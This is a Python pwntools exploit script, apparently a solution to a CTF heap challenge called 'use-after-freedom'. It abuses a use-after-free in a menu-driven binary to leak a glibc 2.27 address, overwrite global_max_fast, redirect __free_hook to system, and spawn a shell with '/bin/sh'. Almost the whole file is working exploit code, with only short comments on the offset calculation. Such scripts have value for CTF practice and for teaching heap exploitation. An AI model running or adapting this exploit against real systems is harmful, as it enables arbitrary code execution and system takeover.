from pwn import *


elf = ELF('./libc-2.27.so')
#io = remote('use-after-freedom.hsc.tf', 1337)
#io = process('./uaf', env={"LD_PRELOAD":"./libc-2.27.so"})
io = process('./uaf')

def add(size, data):
    print(io.recvuntil(b'> '))
    io.sendline(b'1')
    print(io.recvuntil(b'> '))
    io.sendline(str(size))
    print(io.recvuntil(b'> '))
    io.send(data)

def remove(index):
    print(io.recvuntil(b'> '))
    io.sendline(b'2')
    print(io.recvuntil(b'> '))
    io.sendline(str(index))

def change(index, data):
    print(io.recvuntil(b'> '))
    io.sendline(b'3')
    print(io.recvuntil(b'> '))
    io.sendline(str(index))
    print(io.recvuntil(b'> '))
    io.send(data)

def view(index):
    print(io.recvuntil(b'> '))
    io.sendline(b'4')
    print(io.recvuntil(b'> '))
    io.sendline(str(index))


# delta is the distance between the first fastbin and the target in bytes
# calculate delta = (main_arena+112) - (__free_hook) = 0x1c90
# so chunk_size = (delta*2) + 0x20 = 0x3890

size = 0x1c90*2+0x20

add(size, 'ok')
add(20, 'bruh')
remove(0)
view(0)
elf.address = u64(io.recv(6)+b'\0\0')-3973520-elf.sym['__libc_start_main']
print(hex(elf.address))
global_max_fast = elf.address + 0x3ed940
change(0, p64(0)+p64(global_max_fast - 0x10))
add(size, 'FUCK')
remove(2)
change(2, p64(elf.sym['system']))
add(size, '/bin/sh\0')
remove(3)
io.interactive()
